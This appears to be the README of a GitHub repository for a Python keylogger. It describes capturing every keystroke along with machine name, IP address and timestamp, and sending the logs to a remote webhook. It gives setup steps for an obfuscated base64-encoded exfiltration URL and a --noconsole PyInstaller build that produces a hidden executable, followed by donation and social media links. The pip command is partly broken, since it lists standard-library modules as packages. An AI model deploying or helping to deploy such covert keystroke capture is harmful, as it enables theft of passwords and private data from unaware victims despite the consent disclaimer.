# Keylogger README

## Overview

This repository contains a Python script for a basic keylogger. A keylogger is a type of surveillance software that monitors and records keystrokes made by a user on a computer. This script specifically captures keyboard inputs and sends the recorded 
data to a remote server via a webhook URL.

---

**Disclaimer**: Keylogging is a sensitive activity and can be used for both legitimate and malicious purposes. Ensure that you use this script only in compliance with all applicable laws and regulations, and always obtain explicit consent from users before monitoring their keystrokes.

> * Warning *
Any damage caused by the use of this keylogger is entirely your responsibility. I am not liable for any misuse, damages, or legal consequences resulting from the use of this script. Use this tool responsibly and ensure compliance with all legal and ethical standards.

## Features

- **Keystroke Capture**: Listens for and records every key pressed by the user.
- **Asynchronous Data Transmission**: Sends recorded keystroke data to a specified server asynchronously.
- **System Information**: Includes machine name, IP address, and timestamp in the logs.

## Dependencies

The script relies on several Python libraries. If any of these libraries are missing, an `ImportError` will be raised:

- `base64`: For encoding and decoding data in base64 format.
- `json`: For converting between Python objects and JSON format.
- `asyncio`: For asynchronous programming and non-blocking operations.
- `socket`: For network-related operations such as fetching IP addresses.
- `requests`: For sending HTTP requests to the remote server.
- `logging`: For logging information and errors.
- `datetime`: For timestamping events.
- `pynput`: For capturing keyboard inputs.

Ensure these dependencies are installed in your Python environment.

## Setup

1. **Install Dependencies**

   Install the required libraries using pip:
   ```bash
   pip install base64 json asyncio socket requests logging pynput
   ```

2. **Configure the Webhook URL**

   The script uses a base64 encoded webhook URL for sending keystroke logs. Replace the base64 encoded URL with your own webhook endpoint. Decode and re-encode the URL as needed to maintain obfuscation.

3. **Update Webhook URL**

   In the script, find the `self.url` assignment in the `__init__` method and update it with your decoded webhook URL:
   ```python
   self.url = base64.b64decode("YOUR_BASE64_ENCODED_URL").decode("utf-8")
   ```

## Usage

1. **Run the Script**

   Execute the script to start logging keystrokes:
   ```bash
   python keylogger.py
   ```

2. **Logging**

   The script will start capturing keystrokes and logging them. It will send batches of recorded keystrokes to the remote server when the number of pressed keys exceeds 20.

3. **Viewing Logs**

   Logs are sent to the specified webhook URL. Check the server configured at this URL to view the captured keystrokes and other information.


# How To Build exe?
```bash
pyinstaller --onefile --name {INSERT_NAME} --noconsole run.py
```

Upon Successful Execution:
![IMG_20240907_204035](https://github.com/user-attachments/assets/7418c025-f408-4e46-bd1f-9b901f66bd96)


## Security Considerations

- Ensure that the webhook URL is kept confidential and secure.
- Obtain consent from users before deploying the keylogger.
- Be aware of and comply with legal regulations regarding the use of keylogging software.

---

**Note**: This README provides a comprehensive guide to setting up and using the keylogger script. Ensure to use this tool responsibly and ethically.



### 个人捐赠支持
如果您认为该项目对您有所帮助，并且愿意个人捐赠以支持其持续发展和维护，🥰我非常感激您的慷慨。
您的捐赠将帮助我继续改进和添加新功能到该项目中。 通过财务捐赠，您将有助于确保该项目保持免
费和对所有人开放。即使是一小笔捐款也能产生巨大的影响，也是对我个人的鼓励。

以下是我的支付宝二维码，您可以扫描二维码进行个人捐赠：

<br />

| 微信支付 | 支付宝支付 |
| --- | --- |
| <img src="https://github.com/ctkqiang/ctkqiang/blob/main/assets/IMG_9863.jpg?raw=true" height="500" /> | <img src="https://github.com/ctkqiang/ctkqiang/blob/main/assets/IMG_9859.JPG?raw=true" height="500" /> |

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/F1F5VCZJU)



## 爱心捐款
<a href="https://qr.alipay.com/fkx19369scgxdrkv8mxso92"><img src="https://img.shields.io/badge/alipay-00A1E9?style=for-the-badge&logo=alipay&logoColor=white"></a> <a href="https://ko-fi.com/F1F5VCZJU"><img src="https://img.shields.io/badge/Ko--fi-F16061?style=for-the-badge&logo=ko-fi&logoColor=white"></a> <a href="https://www.paypal.com/paypalme/ctkqiang"><img src="https://img.shields.io/badge/PayPal-00457C?style=for-the-badge&logo=paypal&logoColor=white"></a> <a href="https://donate.stripe.com/00gg2nefu6TK1LqeUY"><img src="https://img.shields.io/badge/Stripe-626CD9?style=for-the-badge&logo=Stripe&logoColor=white"></a>

## 关注我
<a href="https://twitch.tv/ctkqiang"><img src="https://img.shields.io/badge/Twitch-9146FF?style=for-the-badge&logo=twitch&logoColor=white"></a> <a href="https://open.spotify.com/user/22sblyn4dsymya3xinw3umhai"><img src="https://img.shields.io/badge/Spotify-1ED760?&style=for-the-badge&logo=spotify&logoColor=white"></a> <a href="https://www.tiktok.com/@ctkqiang"><img src="https://img.shields.io/badge/TikTok-000000?style=for-the-badge&logo=tiktok&logoColor=white"></a> <a href="https://stackoverflow.com/users/10758321/%e9%92%9f%e6%99%ba%e5%bc%ba"><img src="https://img.shields.io/badge/Stack_Overflow-FE7A16?style=for-the-badge&logo=stack-overflow&logoColor=white"></a> <a href="https://www.facebook.com/JohnMelodyme/"><img src="https://img.shields.io/badge/Facebook-1877F2?style=for-the-badge&logo=facebook&logoColor=white"></a> <a href="https://github.com/ctkqiang"><img src="https://img.shields.io/badge/GitHub-100000?style=for-the-badge&logo=github&logoColor=white"></a> <a href="https://www.instagram.com/ctkqiang"><img src="https://img.shields.io/badge/Instagram-E4405F?style=for-the-badge&logo=instagram&logoColor=white"></a> <a href="https://www.linkedin.com/in/ctkqiang/"><img src="https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white"></a> <a href="https://linktr.ee/ctkqiang.official"><img src="https://img.shields.io/badge/linktree-39E09B?style=for-the-badge&logo=linktree&logoColor=white"></a> <a href="https://github.com/ctkqiang/ctkqiang/blob/main/assets/IMG_9245.JPG?raw=true"><img src="https://img.shields.io/badge/WeChat-07C160?style=for-the-badge&logo=wechat&logoColor=white"></a>


 


